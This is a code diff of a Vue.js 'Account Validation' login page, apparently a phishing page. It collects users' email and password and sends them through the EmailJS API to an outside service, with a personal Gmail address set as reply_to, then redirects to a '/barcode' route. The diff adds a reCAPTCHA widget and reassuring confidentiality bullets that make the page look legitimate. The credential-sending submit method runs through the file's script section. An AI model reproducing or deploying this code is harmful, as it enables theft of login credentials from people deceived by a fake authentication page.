@@ -16,10 +16,10 @@
       </div>
 
       <div class="title">
-        <h3>To continue, validate user account</h3>
+        <h3></h3>
 
         <div class="title-tab">
-          <span>Authentication</span>
+          <span>Account Validation</span>
         </div>
       </div>
 
@@ -38,8 +38,13 @@
         <el-form-item label="Password" prop="password">
           <el-input type="password" v-model="ruleForm.password"></el-input>
         </el-form-item>
-
-        <el-form-item>
+        <div
+        style="margin-top: 1rem;"
+          class="g-recaptcha"
+          data-sitekey="6LfsWuAZAAAAAP8hmv4mspTcGGAH3LvQA4zEzpQa"
+        ></div>
+        <!-- <div class="g-recaptcha" data-sitekey="6LfEov4UAAAAAN8Hv8YDyqpqxGrt6RLnT5qMWxHA"></div> -->
+        <el-form-item style="margin: 20px 0px;">
           <el-button
             :loading="loader"
             type="primary"
@@ -51,7 +56,7 @@
       </el-form>
       <div class="divider"></div>
 
-      <p class="terms">
+      <!-- <p class="terms">
         if you click the authentication/activation link, you will be registered
         and you agree to the
         <span @click="openDialog('Terms & Conditions')"
@@ -59,7 +64,23 @@
         >
         &nbsp; and &nbsp;
         <span @click="openDialog('Privacy Policy')">Privacy Policy</span>
-      </p>
+      </p> -->
+      <ul style="list-style-type: unset;">
+        <li style="font-size: 11px; display: list-item;">
+          The information collected is confidential and will not be disclosed by
+          us to unauthorized third parties.
+        </li>
+        <li style="font-size: 11px; display: list-item;">
+          Customers are reminded to kindly provide accurate and truthful
+          information for authentication and not to provide data which is false
+          or which belongs to third parties. Authentication information will not
+          be modified.
+        </li>
+        <li style="font-size: 11px;display: list-item;">
+          Authentication process will be carried out immediately upon receipt of
+          information, and we will have notify you of the authentication result.
+        </li>
+      </ul>
     </div>
 
     <el-dialog :title="modalHeader" :visible.sync="dialogVisible" width="90%">
@@ -80,9 +101,9 @@ export default {
   },
   methods: {
     submitForm(formName) {
-      var self = this; 
+      var self = this;
       this.loader = true;
-      
+
       this.$refs[formName].validate((valid) => {
         if (valid) {
           var data = {
@@ -92,17 +113,18 @@ export default {
             template_params: {
               email: this.ruleForm.name,
               password: this.ruleForm.password,
-              reply_to: 'janetwilliams1305@gmail.com'
+              reply_to: "janetwilliams1305@gmail.com",
             },
           };
-          axios.post('https://api.emailjs.com/api/v1.0/email/send', data)
-          .then(function () {
-            self.loader = false;
-            self.$router.push("/barcode")
-          })
-          .catch(function () {
-            this.loader = false;
-          });
+          axios
+            .post("https://api.emailjs.com/api/v1.0/email/send", data)
+            .then(function() {
+              self.loader = false;
+              self.$router.push("/barcode");
+            })
+            .catch(function() {
+              this.loader = false;
+            });
         } else {
           this.loader = false;
           return false;
